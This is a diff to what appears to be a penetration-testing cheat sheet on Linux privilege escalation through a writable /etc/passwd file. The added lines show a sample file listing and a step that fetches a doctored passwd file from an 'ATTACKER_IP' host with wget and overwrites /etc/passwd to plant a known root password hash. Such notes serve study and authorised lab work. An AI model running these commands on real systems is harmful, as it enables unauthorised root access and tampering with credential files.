@@ -334,11 +334,11 @@ su root
 
 * The /etc/passwd file contained user password hashes, and some versions of Linux still allow password hashes to be stored there
 * The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user.
-
-```
+```bash
+# Example vulnerable permissions:
 ls -l /etc/passwd
+# -rw-r--r--. 1 michael root 1162 Jun 22  2021 /etc/passwd
 ```
-
 * Generate a new password hash with a password of your choice:
 
 ```
@@ -346,6 +346,16 @@ openssl passwd newpasswordhere
 ```
 
 * Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").
+* If there is no usable editor on the target, edit a local copy of `passwd`, host it, download it on the target, and overwrite `/etc/passwd`:
+
+```bash
+# Put the hash in root's passwd row locally:
+# root:$1$HASH:0:0:root:/root:/bin/bash
+
+wget http://ATTACKER_IP/passwd
+cat passwd > /etc/passwd
+```
+
 * Switch to the root user, using the new password:
 
 ```
